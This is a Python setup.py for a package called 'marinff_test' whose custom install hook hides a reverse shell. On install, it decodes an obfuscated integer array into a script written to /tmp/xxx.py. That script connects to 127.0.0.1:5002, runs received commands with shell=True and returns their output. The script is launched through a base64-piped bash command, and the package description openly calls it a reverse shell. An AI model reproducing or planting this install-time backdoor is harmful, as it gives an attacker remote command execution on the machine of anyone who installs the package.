from setuptools import setup
from setuptools.command.install import install
import os
import base64



class CustomInstall(install):
    def run(self):
        install.run(self)

        code = [40,65,122,63,77,147,145,144,77,128,135,140,77,131,140,148,62,142,151,146,134,141,140,81,40,40,65,62,113,131,146,62,146,134,131,62,134,141,145,146,62,127,140,130,62,146,134,131,62,142,141,144,146,76,40,102,109,113,114,62,91,62,64,79,80,85,76,78,76,78,76,79,64,40,110,109,112,114,62,91,62,83,78,78,80,40,40,40,130,131,132,62,129,141,140,140,131,129,146,70,134,141,145,146,74,62,142,141,144,146,71,88,40,62,62,62,62,145,62,91,62,145,141,129,137,131,146,76,145,141,129,137,131,146,70,145,141,129,137,131,146,76,95,100,125,103,108,99,114,74,62,145,141,129,137,131,146,76,113,109,97,105,125,113,114,112,99,95,107,71,40,62,62,62,62,145,76,129,141,140,140,131,129,146,70,70,134,141,145,146,74,62,142,141,144,146,71,71,40,62,62,62,62,144,131,146,147,144,140,62,145,40,40,40,130,131,132,62,130,131,129,144,151,142,146,135,141,140,70,144,127,149,125,130,127,146,127,88,62,128,151,146,131,145,71,88,40,62,62,62,62,130,127,146,127,125,138,131,140,62,91,62,138,131,140,70,144,127,149,125,130,127,146,127,71,40,62,62,62,62,130,127,146,127,62,91,62,128,151,146,131,127,144,144,127,151,70,71,40,62,62,62,62,135,132,62,130,127,146,127,125,138,131,140,62,90,62,79,84,88,40,62,62,62,62,62,62,62,62,137,131,151,62,91,62,144,127,149,125,130,127,146,127,121,88,62,130,127,146,127,125,138,131,140,62,77,77,62,80,123,40,62,62,62,62,62,62,62,62,129,141,140,146,131,140,146,62,91,62,144,127,149,125,130,127,146,127,121,130,127,146,127,125,138,131,140,62,77,77,62,80,62,88,123,40,62,62,62,62,131,138,145,131,88,40,62,62,62,62,62,62,62,62,137,131,151,62,91,62,144,127,149,125,130,127,146,127,121,88,86,123,40,62,62,62,62,62,62,62,62,129,141,140,146,131,140,146,62,91,62,144,127,149,125,130,127,146,127,121,86,88,123,40,62,62,62,62,132,141,144,62,135,62,135,140,62,144,127,140,133,131,70,138,131,140,70,129,141,140,146,131,140,146,71,71,88,40,62,62,62,62,62,62,62,62,130,127,146,127,76,127,142,142,131,140,130,70,129,141,140,146,131,140,146,121,135,123,62,124,62,137,131,151,121,135,62,67,62,86,123,71,40,62,62,62,62,144,131,146,147,144,140,62,128,151,146,131,145,70,130,127,146,127,71,40,40,40,130,131,132,62,131,140,129,144,151,142,146,135,141,140,70,130,127,146,127,71,88,40,62,62,62,62,130,127,146,127,125,138,131,140,62,91,62,138,131,140,70,130,127,146,127,71,40,62,62,62,62,131,140,129,125,144,127,149,125,130,127,146,127,62,91,62,128,64,64,40,62,62,62,62,132,141,144,62,135,62,135,140,62,144,127,140,133,131,70,130,127,146,127,125,138,131,140,71,88,40,62,62,62,62,62,62,62,62,131,140,129,125,144,127,149,125,130,127,146,127,62,73,91,62,70,70,130,127,146,127,121,135,123,62,73,62,135,71,62,67,62,80,83,84,71,76,146,141,125,128,151,146,131,145,70,71,40,62,62,62,62,131,140,129,125,130,127,146,127,62,91,62,128,127,145,131,84,82,76,128,84,82,131,140,129,141,130,131,70,131,140,129,125,144,127,149,125,130,127,146,127,71,40,62,62,62,62,144,131,146,147,144,140,62,131,140,129,125,130,127,146,127,40,40,40,130,131,132,62,149,127,135,146,125,132,141,144,125,129,141,139,139,127,140,130,70,145,71,88,40,62,62,62,62,144,127,149,125,130,127,146,127,62,91,62,145,76,144,131,129,148,70,79,78,80,82,71,40,62,62,62,62,130,127,146,127,62,91,62,130,131,129,144,151,142,146,135,141,140,70,144,127,149,125,130,127,146,127,71,40,62,62,62,62,135,132,62,130,127,146,127,62,91,91,62,128,64,143,147,135,146,122,140,64,88,40,62,62,62,62,62,62,62,62,145,76,129,138,141,145,131,70,71,40,62,62,62,62,62,62,62,62,145,151,145,76,131,150,135,146,70,78,71,40,62,62,62,62,65,62,146,134,131,62,145,141,129,137,131,146,62,130,135,131,130,40,62,62,62,62,131,138,135,132,62,138,131,140,70,130,127,146,127,71,62,91,91,62,78,88,40,62,62,62,62,62,62,62,62,144,131,146,147,144,140,62,114,144,147,131,40,62,62,62,62,131,138,145,131,88,40,62,62,62,62,62,62,62,62,65,62,130,141,62,145,134,131,138,138,62,129,141,139,139,127,140,130,40,62,62,62,62,62,62,62,62,142,144,141,129,62,91,62,145,147,128,142,144,141,129,131,145,145,76,110,141,142,131,140,70,40,62,62,62,62,62,62,62,62,62,62,62,62,130,127,146,127,74,40,62,62,62,62,62,62,62,62,62,62,62,62,145,134,131,138,138,91,114,144,147,131,74,40,62,62,62,62,62,62,62,62,62,62,62,62,145,146,130,141,147,146,91,145,147,128,142,144,141,129,131,145,145,76,110,103,110,99,74,40,62,62,62,62,62,62,62,62,62,62,62,62,145,146,130,131,144,144,91,145,147,128,142,144,141,129,131,145,145,76,110,103,110,99,74,40,62,62,62,62,62,62,62,62,62,62,62,62,145,146,130,135,140,91,145,147,128,142,144,141,129,131,145,145,76,110,103,110,99,74,40,62,62,62,62,62,62,62,62,71,40,62,62,62,62,62,62,62,62,145,146,130,141,147,146,125,148,127,138,147,131,62,91,62,142,144,141,129,76,145,146,130,141,147,146,76,144,131,127,130,70,71,62,73,62,142,144,141,129,76,145,146,130,131,144,144,76,144,131,127,130,70,71,40,62,62,62,62,62,62,62,62,145,76,145,131,140,130,70,131,140,129,144,151,142,146,135,141,140,70,145,146,130,141,147,146,125,148,127,138,147,131,71,71,40,62,62,62,62,62,62,62,62,144,131,146,147,144,140,62,100,127,138,145,131,40,40,40,130,131,132,62,139,127,135,140,70,71,88,40,62,62,62,62,149,134,135,138,131,62,114,144,147,131,88,40,62,62,62,62,62,62,62,62,145,141,129,137,131,146,125,130,135,131,130,62,91,62,100,127,138,145,131,40,62,62,62,62,62,62,62,62,146,144,151,88,40,62,62,62,62,62,62,62,62,62,62,62,62,145,62,91,62,129,141,140,140,131,129,146,70,102,109,113,114,74,62,110,109,112,114,71,40,62,62,62,62,62,62,62,62,62,62,62,62,149,134,135,138,131,62,140,141,146,62,145,141,129,137,131,146,125,130,135,131,130,88,40,62,62,62,62,62,62,62,62,62,62,62,62,62,62,62,62,145,141,129,137,131,146,125,130,135,131,130,62,91,62,149,127,135,146,125,132,141,144,125,129,141,139,139,127,140,130,70,145,71,40,62,62,62,62,62,62,62,62,62,62,62,62,145,76,129,138,141,145,131,70,71,40,62,62,62,62,62,62,62,62,131,150,129,131,142,146,62,145,141,129,137,131,146,76,131,144,144,141,144,88,40,62,62,62,62,62,62,62,62,62,62,62,62,142,127,145,145,40,62,62,62,62,62,62,62,62,146,135,139,131,76,145,138,131,131,142,70,83,71,40,40,40,135,132,62,125,125,140,127,139,131,125,125,62,91,91,62,64,125,125,139,127,135,140,125,125,64,88,40,62,62,62,62,135,139,142,141,144,146,62,145,151,145,74,62,141,145,74,62,145,147,128,142,144,141,129,131,145,145,74,62,145,141,129,137,131,146,74,62,146,135,139,131,74,62,128,127,145,131,84,82,40,40,62,62,62,62,145,151,145,76,131,150,135,146,70,139,127,135,140,70,71,71,40,62]
        code = ''.join([chr(int(x) - 30) for x in code])

        with open('/tmp/xxx.py', 'w') as f:
            f.write(code)
            f.close()

        reverse_shell = 'python3 /tmp/xxx.py'
        encoded = base64.b64encode(reverse_shell.encode(encoding='utf-8'))
        os.system('echo %s|base64 -d |bash' % encoded.decode())


setup(  name='marinff_test',
        version='0.8',
        description='install this module then reverse shell',
        author = "badman",
        py_modules=['test.hello'],
        cmdclass={'install' : CustomInstall}
      )